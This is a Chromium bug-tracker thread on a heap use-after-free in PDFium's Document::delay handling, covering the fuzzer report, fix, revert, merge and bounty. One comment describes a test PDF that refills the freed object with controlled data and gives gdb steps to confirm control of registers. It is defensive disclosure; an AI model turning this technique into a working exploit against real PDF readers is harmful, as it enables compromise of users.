Minimized Testcase (1.68 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94jMu5nEZM9qBjg7X4FaCZMtFA47spGg8rmGgQzsLJfWqrwgxftsN37r03jEYyFsIFB1s5E-rYHaFxOy-sJhHlOD9Mqdi8ueOQwdmo5b2eYKWWkvo_UxHBppI9wTOhi3v7Nq3Qw-xpweuphdqe-81oxKiCSoQ



### cl...@chromium.org (2015-05-31)

[Empty comment from Monorail migration]

### ch...@gmail.com (2015-06-01)

[Comment Deleted]

### ch...@gmail.com (2015-06-01)

It is also possible to cause the bug in Document::delay method of third_party\pdfium\fpdfsdk\src\javascript\Document.cpp. Attached testuafdocument1.pdf and testuafdocument2.pdf files triggers the bug in 2 different ways.

### ch...@gmail.com (2015-06-01)

Fix is submitted for review.
https://codereview.chromium.org/1163823002/

### ts...@chromium.org (2015-06-02)

Patch from Chamal approved and landed at https://pdfium.googlesource.com/pdfium/+/4ff7a4246c81a71b4f878e959b3ca304cd76ec8a

Sadly, I forgot to edit the description to update the author info before landing, but the the patch is Chamals.

### cl...@chromium.org (2015-06-02)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### bu...@chromium.org (2015-06-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6e5d15268c5d75ba15189ce0a6050845068eb06b

commit 6e5d15268c5d75ba15189ce0a6050845068eb06b
Author: tsepez <tsepez@chromium.org>
Date: Wed Jun 03 00:50:49 2015

Roll PDFium to b29338d

This brings in:
b29338d Fix windows compile: fix size_t vs. int mismatch
e06b686 kill IPDF_DocParser().
4ff7a42 Fix heap use after free in Document::DoFieldDelay and Document::delay
8e1b608 Add missing comma to third_party.gyp
cafa3fd Run V8 in predictable mode for pdfium_test
8ba4a3c Fix suppressions for 2015-05-28 drop
878b819 Roll DEPS to pick up 2015-05-28 corpus drop.
6b776fe Fix ALL the include guards.
14f57a1 Remove rendundant ../include from paths of files in include/ directory
cddfde0 Upgrade openjpeg to r3002
5f566b3 Update copy of safe_math_impl.h to take a fix from upstream:
e6406b3 Fix four annoying warnings: Two "set but unused".
bc4b82e Fix an endless loop in CJBig2_HuffmanTable::parseFromCodedBuffer
79569e7 Get test running scripts to detect and report common error.
e9ccc9b Integer overflow in CJBig2_Image::expand
3a25130 Tidy public fpdfview.h and fpdf_flatten.h.
b190fc2 Turn on warnings for usage of disabled V8 APIs
981a346 Re-land: Remove FX_Alloc() null checks now that it can't return NULL.
bf4aa2c Revert "Remove FX_Alloc() null checks now that it can't return NULL."
eb65277 Remove FX_Alloc() null checks now that it can't return NULL.
59f4b44 Fix Heap Overflow in CJBig2_Image::expand
3b60890 Cleanup if early return from opj_j2k_copy_default_tcp_and_create_tcd().
3fea540 Replace v8::Handle with v8::Local and v8::Persistent with v8::Global
0c94bc4 Change FX_Alloc to FX_Try_Alloc in _JpegEncode
31b3a2b Add safe FX_Alloc2D() macro
a88e3a1 Add myself to OWNERS file
d94df88 Replace deprecated with non-deprecated V8 APIs
1962d61 Fix leaks in embedder test's FlateEncode() usage and in FlateEncode().
69b4bc7 Disable allocation tests that hose the bot.
acae925 Initialize members of CPDF_TextPageFind class.
61ffad8 Fix leaks in the embedder tests themselves.
9f6f348 Abort on OOM by default in FX_Alloc().
dc0bd92 Remove FX_NEW_VECTOR() macros.
7f3b99a Fix potential UAF in ConcatInPlace.
b60617f Fix another batch of compiler warnings.

BUG=459215,482639,483981,486538,487928,488302
R=thestig@chromium.org

Review URL: https://codereview.chromium.org/1159433007

Cr-Commit-Position: refs/heads/master@{#332514}

[modify] http://crrev.com/6e5d15268c5d75ba15189ce0a6050845068eb06b/DEPS


### bu...@chromium.org (2015-06-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/af1125ea286450ceecc23a37c6710bcf0b2d1ce6

commit af1125ea286450ceecc23a37c6710bcf0b2d1ce6
Author: engedy <engedy@chromium.org>
Date: Wed Jun 03 09:15:29 2015

Revert of Roll PDFium to b29338d (patchset #2 id:20001 of https://codereview.chromium.org/1159433007/)

Reason for revert:
Causes compile errors on "Linux GN Clobber" bot:

../../third_party/pdfium/core/src/fxcrt/fx_basic_memmgr_unittest.cpp:23:31:error: expression result unused [-Werror,-Wunused-value]
    EXPECT_DEATH_IF_SUPPORTED(FX_Alloc(int, kMaxIntAlloc), "");

Archived full build log: https://goo.gl/4OImxB.

Original issue's description:
> Roll PDFium to b29338d
>
> This brings in:
> b29338d Fix windows compile: fix size_t vs. int mismatch
> e06b686 kill IPDF_DocParser().
> 4ff7a42 Fix heap use after free in Document::DoFieldDelay and Document::delay
> 8e1b608 Add missing comma to third_party.gyp
> cafa3fd Run V8 in predictable mode for pdfium_test
> 8ba4a3c Fix suppressions for 2015-05-28 drop
> 878b819 Roll DEPS to pick up 2015-05-28 corpus drop.
> 6b776fe Fix ALL the include guards.
> 14f57a1 Remove rendundant ../include from paths of files in include/ directory
> cddfde0 Upgrade openjpeg to r3002
> 5f566b3 Update copy of safe_math_impl.h to take a fix from upstream:
> e6406b3 Fix four annoying warnings: Two "set but unused".
> bc4b82e Fix an endless loop in CJBig2_HuffmanTable::parseFromCodedBuffer
> 79569e7 Get test running scripts to detect and report common error.
> e9ccc9b Integer overflow in CJBig2_Image::expand
> 3a25130 Tidy public fpdfview.h and fpdf_flatten.h.
> b190fc2 Turn on warnings for usage of disabled V8 APIs
> 981a346 Re-land: Remove FX_Alloc() null checks now that it can't return NULL.
> bf4aa2c Revert "Remove FX_Alloc() null checks now that it can't return NULL."
> eb65277 Remove FX_Alloc() null checks now that it can't return NULL.
> 59f4b44 Fix Heap Overflow in CJBig2_Image::expand
> 3b60890 Cleanup if early return from opj_j2k_copy_default_tcp_and_create_tcd().
> 3fea540 Replace v8::Handle with v8::Local and v8::Persistent with v8::Global
> 0c94bc4 Change FX_Alloc to FX_Try_Alloc in _JpegEncode
> 31b3a2b Add safe FX_Alloc2D() macro
> a88e3a1 Add myself to OWNERS file
> d94df88 Replace deprecated with non-deprecated V8 APIs
> 1962d61 Fix leaks in embedder test's FlateEncode() usage and in FlateEncode().
> 69b4bc7 Disable allocation tests that hose the bot.
> acae925 Initialize members of CPDF_TextPageFind class.
> 61ffad8 Fix leaks in the embedder tests themselves.
> 9f6f348 Abort on OOM by default in FX_Alloc().
> dc0bd92 Remove FX_NEW_VECTOR() macros.
> 7f3b99a Fix potential UAF in ConcatInPlace.
> b60617f Fix another batch of compiler warnings.
>
> BUG=459215,482639,483981,486538,487928,488302
> R=thestig@chromium.org
>
> Committed: https://crrev.com/6e5d15268c5d75ba15189ce0a6050845068eb06b
> Cr-Commit-Position: refs/heads/master@{#332514}

TBR=thestig@chromium.org,tsepez@chromium.org
NOPRESUBMIT=true
NOTREECHECKS=true
NOTRY=true
BUG=459215,482639,483981,486538,487928,488302

Review URL: https://codereview.chromium.org/1162103004

Cr-Commit-Position: refs/heads/master@{#332579}

[modify] http://crrev.com/af1125ea286450ceecc23a37c6710bcf0b2d1ce6/DEPS


### bu...@chromium.org (2015-06-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1203cc8c7e82ab31d99190ccd595e813ac7ab9f9

commit 1203cc8c7e82ab31d99190ccd595e813ac7ab9f9
Author: tsepez <tsepez@chromium.org>
Date: Wed Jun 03 21:26:06 2015

Roll PDFium to 7bb4d8d

This brings in:
7bb4d8d Fix fx_basic_memmgr_unittest.cpp under stricter GN rules
a76f557 Automated test case for 487928.
b29338d Fix windows compile: fix size_t vs. int mismatch
e06b686 kill IPDF_DocParser().
4ff7a42 Fix heap use after free in Document::DoFieldDelay and Document::delay
8e1b608 Add missing comma to third_party.gyp
cafa3fd Run V8 in predictable mode for pdfium_test
8ba4a3c Fix suppressions for 2015-05-28 drop
878b819 Roll DEPS to pick up 2015-05-28 corpus drop.
6b776fe Fix ALL the include guards.
14f57a1 Remove rendundant ../include from paths of files in include/ directory
cddfde0 Upgrade openjpeg to r3002
5f566b3 Update copy of safe_math_impl.h to take a fix from upstream:
e6406b3 Fix four annoying warnings: Two "set but unused".
bc4b82e Fix an endless loop in CJBig2_HuffmanTable::parseFromCodedBuffer
79569e7 Get test running scripts to detect and report common error.
e9ccc9b Integer overflow in CJBig2_Image::expand
3a25130 Tidy public fpdfview.h and fpdf_flatten.h.
b190fc2 Turn on warnings for usage of disabled V8 APIs
981a346 Re-land: Remove FX_Alloc() null checks now that it can't return NULL.
bf4aa2c Revert "Remove FX_Alloc() null checks now that it can't return NULL."
eb65277 Remove FX_Alloc() null checks now that it can't return NULL.
59f4b44 Fix Heap Overflow in CJBig2_Image::expand
3b60890 Cleanup if early return from opj_j2k_copy_default_tcp_and_create_tcd().
3fea540 Replace v8::Handle with v8::Local and v8::Persistent with v8::Global
0c94bc4 Change FX_Alloc to FX_Try_Alloc in _JpegEncode
31b3a2b Add safe FX_Alloc2D() macro
a88e3a1 Add myself to OWNERS file
d94df88 Replace deprecated with non-deprecated V8 APIs
1962d61 Fix leaks in embedder test's FlateEncode() usage and in FlateEncode().
69b4bc7 Disable allocation tests that hose the bot.
acae925 Initialize members of CPDF_TextPageFind class.
61ffad8 Fix leaks in the embedder tests themselves.
9f6f348 Abort on OOM by default in FX_Alloc().
dc0bd92 Remove FX_NEW_VECTOR() macros.
7f3b99a Fix potential UAF in ConcatInPlace.
b60617f Fix another batch of compiler warnings.

BUG=459215,482639,483981,486538,487928,488302
R=thestig@chromium.org

Committed: https://crrev.com/6e5d15268c5d75ba15189ce0a6050845068eb06b
Cr-Commit-Position: refs/heads/master@{#332514}

Review URL: https://codereview.chromium.org/1159433007

Cr-Commit-Position: refs/heads/master@{#332687}

[modify] http://crrev.com/1203cc8c7e82ab31d99190ccd595e813ac7ab9f9/DEPS


### cl...@chromium.org (2015-06-05)

ClusterFuzz has detected this issue as fixed in range 332390:332520.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6006007101128704

Uploader: nparker@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x611000038c68
Crash State:
  CJS_WideStringArray::~CJS_WideStringArray
  Document::DoFieldDelay
  void JSPropSetter<Field, &Field::delay>
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=271393:271739
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=332390:332520

Minimized Testcase (1.68 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94jMu5nEZM9qBjg7X4FaCZMtFA47spGg8rmGgQzsLJfWqrwgxftsN37r03jEYyFsIFB1s5E-rYHaFxOy-sJhHlOD9Mqdi8ueOQwdmo5b2eYKWWkvo_UxHBppI9wTOhi3v7Nq3Qw-xpweuphdqe-81oxKiCSoQ

If you suspect that the result above is incorrect,try re-doing that job on the test case report page.

### ch...@gmail.com (2015-06-08)

Comment about Exploitability

Attached test_allocate.pdf allocates a CFX_WideString object(With unicode "A" characters) at the deleted space of CJS_DelayData object.
But it is not possible to write user controlled values to all the deleted space of CJS_DelayData object.
Open test_allocate.pdf file in a pdf editor to view javascript code of this test case.
Javascript code is available under Document Javascript section and Validate option of txtName text field.

Versions
OS: Ubuntu 14.04
Chrome:43.0.2357.81 (64-bit) stable release.

1. Open chrome.
2. Open any pdf file which does not crash.
   This is necessary to attach gdb to plugin process.
3. Open chrome Task Manager and note down the process id of pdf plugin process.
4. Open another terminal.
5. Type sudo gdb -p "process id of pdf plugin process".
6. Open attached test_allocate.pdf file with chrome.
7. gdb will break with SIGSEGV.
8. Type in gdb prompt.
   i r rax
   Value of rax register will be 0x4100000041

   i r r12
   Value of r12 register will be 0x41

### ti...@google.com (2015-07-08)

Merge-Request to M44 (2403) PDFium branch.

### pe...@google.com (2015-07-08)

[Automated comment] Reverts referenced in bugdroid comments, needs manual review.

### pe...@google.com (2015-07-10)

You're going to need to give me very specific CLs that need to go to M44 pdfium.  We don't just roll a whole bunch of CLs.  Then they'll need to be cherry-picked after I approve.

### pe...@google.com (2015-07-10)

[Empty comment from Monorail migration]

### th...@chromium.org (2015-07-13)

We need to cherrypick https://pdfium.googlesource.com/pdfium/+/4ff7a4246c81a71b4f878e959b3ca304cd76ec8a

### pe...@chromium.org (2015-07-13)

Approved for merge to m44 branch https://pdfium.googlesource.com/pdfium/+log/refs/heads/chromium/2403.

Thanks Lei.

### pe...@chromium.org (2015-07-13)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-07-16)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-07-24)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-17)

Congratulations: $4,337 for this report!

Panel notes: $3000 for the bug, $1337 for the patch.

### ti...@google.com (2015-08-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-09-08)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-09-10)

Processing via our e-payment system takes ~7 days, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/487928?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082074)*
